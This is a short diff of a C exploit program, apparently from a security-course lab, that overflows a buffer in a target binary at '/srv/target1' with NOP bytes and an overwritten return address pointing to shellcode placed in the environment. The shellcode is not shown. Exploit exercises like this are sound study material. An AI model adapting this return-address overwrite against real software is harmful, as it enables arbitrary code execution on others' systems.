@@ -7,17 +7,14 @@
 
 #define TARGET "/srv/target1"
 
-#define PADDING_SIZE 8
-#define RETURN_ADDRESS 0xffffd719
-
 int main(void)
 {
   char *args[3]; 
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x19\xd7\xff\xff";
-
+  //Start of buffer
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x00\xd7\xff\xff";
   args[2] = NULL;
   
   env[0] = shellcode;
